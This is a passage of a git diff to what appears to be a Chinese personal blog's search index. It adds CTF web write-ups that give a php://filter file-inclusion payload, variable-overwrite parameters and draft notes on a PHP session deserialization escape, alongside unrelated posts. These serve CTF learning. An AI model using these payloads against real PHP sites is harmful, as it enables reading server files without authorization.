class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>好多payload:</p>
+<pre><code>yds=flag
+is=flag&amp;flag=flag
+</code></pre>
+<h2 id="Had-a-bad-day"><a href="#Had-a-bad-day" class="headerlink" title="Had a bad day"></a>Had a bad day</h2><p>php://filter应用</p>
+<p><a href="https://oatmeal.vip/security/web-learning/php-filter/">https://oatmeal.vip/security/web-learning/php-filter/</a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> 	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>构造:</p>
+<pre><code>php://filter/convert.base64-encode/write=woofers/resource=flag
+</code></pre>
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>代码审计</tag>
+        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
@@ -1295,6 +1295,45 @@ is=flag&amp;flag=flag
       </tags>
   </entry>
   <entry>
+    <title>20220209</title>
+    <url>/posts/cf7d14df/</url>
+    <content><![CDATA[<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><blockquote>
+<p>好难的题，用了2个小时，反序列化逃逸，上一次做还是在选拔赛上</p>
+</blockquote>
+<pre><code>d0g3_f1ag.php
+
+一些草稿
+_SESSION[phpflag]=s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
+
+&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:39:&quot;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+;s&#125;
+
+&quot;a:2:&#123;s:7:&quot;&quot;;hhhhh&quot;;s:1:&quot;1&quot;;s:39:&quot;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+;s&#125;
+
+_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
+此时session数组
+phpfalg ==&gt; ;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
+img ==&gt; 无效路径
+序列化为
+&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+;s:img:xxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;
+过滤后
+&quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+;s:img:xxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot; 逃逸成功
+反序列化，此时session数组
+&quot;;s:48: ==&gt; 1
+img ==&gt; L2QwZzNfZmxsbGxsbGFn
+</code></pre>
+<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CUMTCTF春季赛部分writeup</title>
     <url>/posts/17e673fc/</url>
     <content><![CDATA[<blockquote>
@@ -1394,20 +1433,6 @@ while os.path.exists(p1) or os.path.exists(p2):
       </tags>
   </entry>
   <entry>
-    <title>20220209</title>
-    <url>/posts/cf7d14df/</url>
-    <content><![CDATA[<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><blockquote>
-<p>好难的题，反序列化逃逸，上一次做还是在选拔赛上</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CUMT初夏赛部分wp</title>
     <url>/posts/b061f28/</url>
     <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><blockquote>
@@ -1475,6 +1500,24 @@ print(&#39;&#39;.join(flag))
       </tags>
   </entry>
   <entry>
+    <title>V&amp;NCTF2021</title>
+    <url>/posts/6dd4bc92/</url>
+    <content><![CDATA[<blockquote>
+<p>部分wp</p>
+</blockquote>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="冰冰好像藏着什么密码"><a href="#冰冰好像藏着什么密码" class="headerlink" title="冰冰好像藏着什么密码"></a>冰冰好像藏着什么密码</h3><p>先打开图片，报了一堆错，但能正常提取。FFT是快速傅里叶变化的意思，相当于给了提示，补了一些相关知识。</p>
+<p>原理如下，并不是很复杂：</p>
+<p>首先将图片看作信号,</p>
+<p><img src="https://www.zhihu.com/equation?tex=%5BR+%5C+G+%5C+B%5D+=+f(x,y)"></p>
+]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>VSCode简单配置C艹环境</title>
     <url>/posts/c150e260/</url>
     <content><![CDATA[<h2 id="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"><a href="#百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode" class="headerlink" title="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"></a>百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode</h2><h2 id="脑子是个好东西，建议多动手才好用"><a href="#脑子是个好东西，建议多动手才好用" class="headerlink" title="脑子是个好东西，建议多动手才好用"></a>脑子是个好东西，建议多动手才好用</h2><h2 id="需要的东西已打包，还学不会，建议回家种地"><a href="#需要的东西已打包，还学不会，建议回家种地" class="headerlink" title="需要的东西已打包，还学不会，建议回家种地"></a>需要的东西已打包，还学不会，建议回家种地</h2><h2 id="VSCode在官网上下，别TM随便找到个能下的就下"><a href="#VSCode在官网上下，别TM随便找到个能下的就下" class="headerlink" title="VSCode在官网上下，别TM随便找到个能下的就下"></a>VSCode在官网上下，别TM随便找到个能下的就下</h2><blockquote>
@@ -1510,24 +1553,6 @@ print(&#39;&#39;.join(flag))
       <categories>
         <category>哎，我就是玩</category>
       </categories>
-  </entry>
-  <entry>
-    <title>V&amp;NCTF2021</title>
-    <url>/posts/6dd4bc92/</url>
-    <content><![CDATA[<blockquote>
-<p>部分wp</p>
-</blockquote>
-<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="冰冰好像藏着什么密码"><a href="#冰冰好像藏着什么密码" class="headerlink" title="冰冰好像藏着什么密码"></a>冰冰好像藏着什么密码</h3><p>先打开图片，报了一堆错，但能正常提取。FFT是快速傅里叶变化的意思，相当于给了提示，补了一些相关知识。</p>
-<p>原理如下，并不是很复杂：</p>
-<p>首先将图片看作信号,</p>
-<p><img src="https://www.zhihu.com/equation?tex=%5BR+%5C+G+%5C+B%5D+=+f(x,y)"></p>
-]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
   </entry>
   <entry>
     <title>flask学习</title>
@@ -1747,6 +1772,18 @@ print(&#39;&#39;.join(flag))
       </tags>
   </entry>
   <entry>
+    <title>jwt总结</title>
+    <url>/posts/e8e4811b/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>git更新</title>
     <url>/posts/bc46b23a/</url>
     <content><![CDATA[<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><blockquote>
@@ -1759,18 +1796,6 @@ print(&#39;&#39;.join(flag))
       </categories>
       <tags>
         <tag>git</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>jwt总结</title>
-    <url>/posts/e8e4811b/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -2197,7 +2222,7 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
 <h1 id="联系我"><a href="#联系我" class="headerlink" title="联系我"></a>联系我</h1><p><strong>本项目仅供学习交流使用，如作他用所承受的任何直接、间接法律责任一概与作者无关</strong><br><strong>如果此项目侵犯了您或者您公司的权益，请立即联系我删除</strong></p>
 <p>如果你有不懂的,或者需要api不会搭建的,欢迎联系我,我会看心情给你解答（狗头）</p>
 <blockquote>
-<p>邮箱： <a href="mailto:&#x69;&#x6b;&#x61;&#x65;&#107;&#x6b;&#107;&#x40;&#x64;&#105;&#110;&#x67;&#116;&#x61;&#108;&#107;&#46;&#x63;&#111;&#x6d;">&#x69;&#x6b;&#x61;&#x65;&#107;&#x6b;&#107;&#x40;&#x64;&#105;&#110;&#x67;&#116;&#x61;&#108;&#107;&#46;&#x63;&#111;&#x6d;</a></p>
+<p>邮箱： <a href="mailto:&#x69;&#107;&#x61;&#101;&#x6b;&#107;&#107;&#x40;&#x64;&#105;&#110;&#x67;&#116;&#97;&#108;&#x6b;&#46;&#99;&#111;&#x6d;">&#x69;&#107;&#x61;&#101;&#x6b;&#107;&#107;&#x40;&#x64;&#105;&#110;&#x67;&#116;&#97;&#108;&#x6b;&#46;&#99;&#111;&#x6d;</a></p>
 </blockquote>
 ]]></content>
       <categories>
@@ -2475,6 +2500,31 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       </tags>
   </entry>
   <entry>
+    <title>暑假总结</title>
+    <url>/posts/123f4dc2/</url>
+    <content><![CDATA[<p>不知不觉暑假结束了，这两天写完实习报告终于有时间能简单的总结一下了。</p>
+<ul>
+<li><p>python入门到精通</p>
+</li>
+<li><p>数学建模学了一点点，matlab基本是会用了</p>
+</li>
+<li><p>ctf把bugku上的web刷完了，正在刷buu，学的东西还挺多的，也打了几次线上，感觉好难，道阻且长</p>
+</li>
+<li><p>折腾服务器，搭建了私有云</p>
+</li>
+<li><p>linux 使用的更熟练了，包括docker了等等</p>
+</li>
+<li><p>学会了git使用外加GitHub，之前不是很会</p>
+</li>
+<li><p>洛克王国天梯打到了高级段位</p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
     <title>爬取冰冰vlog.001评论&amp;&amp;做词云</title>
     <url>/posts/6d65a59f/</url>
     <content><![CDATA[<blockquote>
@@ -2509,31 +2559,6 @@ e.g. http://192.168.xxx.xxx:100/ezyii/
       <tags>
         <tag>python</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>暑假总结</title>
-    <url>/posts/123f4dc2/</url>
-    <content><![CDATA[<p>不知不觉暑假结束了，这两天写完实习报告终于有时间能简单的总结一下了。</p>
-<ul>
-<li><p>python入门到精通</p>
-</li>
-<li><p>数学建模学了一点点，matlab基本是会用了</p>
-</li>
-<li><p>ctf把bugku上的web刷完了，正在刷buu，学的东西还挺多的，也打了几次线上，感觉好难，道阻且长</p>
-</li>
-<li><p>折腾服务器，搭建了私有云</p>
-</li>
-<li><p>linux 使用的更熟练了，包括docker了等等</p>
-</li>
-<li><p>学会了git使用外加GitHub，之前不是很会</p>
-</li>
-<li><p>洛克王国天梯打到了高级段位</p>
-</li>
-</ul>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
   </entry>
   <entry>
     <title>线性规划与整数线性规划</title>
